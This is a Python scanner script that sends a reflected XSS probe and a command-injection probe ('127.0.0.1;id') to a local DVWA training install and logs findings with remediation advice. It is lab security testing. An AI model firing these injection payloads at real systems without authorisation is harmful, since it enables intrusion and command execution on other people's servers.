#!/usr/bin/env python3
"""Test all DVWA vulnerability endpoints"""
import asyncio
import aiohttp
from datetime import datetime
import sys
import os

# Add the project directory to Python path
sys.path.insert(0, '/home/michael/recon-platform/modscan')

from asset_manager import AssetManager, VulnerabilityFinding

# All DVWA URLs except SQL injection
DVWA_URLS = [
    "http://192.168.1.42/dvwa/vulnerabilities/exec/",
    "http://192.168.1.42/dvwa/vulnerabilities/csrfa",
    "http://192.168.1.42/dvwa/vulnerabilities/fi/",
    "http://192.168.1.42/dvwa/vulnerabilities/upload/",
    "http://192.168.1.42/dvwa/vulnerabilities/xss_r/",
    "http://192.168.1.42/dvwa/vulnerabilities/xss_s/",
    "http://192.168.1.42/dvwa/vulnerabilities/xss_d/",
    "http://192.168.1.42/dvwa/vulnerabilities/weak_id/",
    "http://192.168.1.42/dvwa/vulnerabilities/csp/",
    "http://192.168.1.42/dvwa/vulnerabilities/redirect/"
]

async def test_xss_vulnerability(session, url):
    """Test XSS vulnerability on a URL"""
    findings = []
    
    try:
        # XSS test
        test_url = f"{url}?name=<script>alert('XSS')</script>"
        print(f"🚨 Testing XSS on {url}")
        
        timeout = aiohttp.ClientTimeout(total=10)
        async with session.get(test_url, timeout=timeout) as response:
            if response.status == 200:
                content = await response.text()
                
                if "<script>alert('XSS')</script>" in content:
                    print(f"✅ XSS FOUND on {url}")
                    
                    finding = VulnerabilityFinding(
                        url=test_url,
                        vuln_type="XSS",
                        severity="High",
                        confidence=0.95,
                        payload="name=<script>alert('XSS')</script>",
                        evidence="XSS payload reflected unescaped in response",
                        discovered_at=datetime.now(),
                        impact_description="XSS vulnerability allows execution of arbitrary JavaScript",
                        remediation="Implement proper input validation and output encoding",
                        affected_parameter="name"
                    )
                    findings.append(finding)
                else:
                    print(f"❌ XSS not found on {url}")
                    
    except Exception as e:
        print(f"❌ XSS test failed for {url}: {e}")
    
    return findings

async def test_command_injection(session, url):
    """Test command injection vulnerability"""
    findings = []
    
    try:
        # Command injection test
        test_url = f"{url}?ip=127.0.0.1;id"
        print(f"🚨 Testing Command Injection on {url}")
        
        timeout = aiohttp.ClientTimeout(total=10)
        async with session.get(test_url, timeout=timeout) as response:
            if response.status == 200:
                content = await response.text()
                
                # Look for command output indicators
                cmd_indicators = ['uid=', 'gid=', 'groups=', 'www-data', 'root']
                
                for indicator in cmd_indicators:
                    if indicator in content:
                        print(f"✅ COMMAND INJECTION FOUND on {url} - {indicator}")
                        
                        finding = VulnerabilityFinding(
                            url=test_url,
                            vuln_type="COMMAND_INJECTION",
                            severity="Critical",
                            confidence=0.90,
                            payload="ip=127.0.0.1;id",
                            evidence=f"Command injection detected: {indicator}",
                            discovered_at=datetime.now(),
                            impact_description="Command injection allows arbitrary command execution",
                            remediation="Use parameterized commands and input validation",
                            affected_parameter="ip"
                        )
                        findings.append(finding)
                        break
                
                if not findings:
                    print(f"❌ Command injection not found on {url}")
                    
    except Exception as e:
        print(f"❌ Command injection test failed for {url}: {e}")
    
    return findings

async def test_all_vulnerabilities():
    """Test all vulnerability types on all URLs"""
    print("🚨 Starting comprehensive DVWA vulnerability testing...")
    
    asset_manager = AssetManager()
    total_findings = 0
    
    async with aiohttp.ClientSession() as session:
        for url in DVWA_URLS:
            print(f"\n📍 Testing URL: {url}")
            
            # Test XSS
            xss_findings = await test_xss_vulnerability(session, url)
            
            # Test Command Injection  
            cmd_findings = await test_command_injection(session, url)
            
            # Store all findings
            all_findings = xss_findings + cmd_findings
            for finding in all_findings:
                try:
                    asset_manager.add_vulnerability_finding(finding, 1)
                    total_findings += 1
                    print(f"💾 Stored {finding.vuln_type} vulnerability")
                except Exception as e:
                    print(f"❌ Failed to store finding: {e}")
    
    print(f"\n🎯 TESTING COMPLETE: Found and stored {total_findings} vulnerabilities")

if __name__ == "__main__":
    asyncio.run(test_all_vulnerabilities())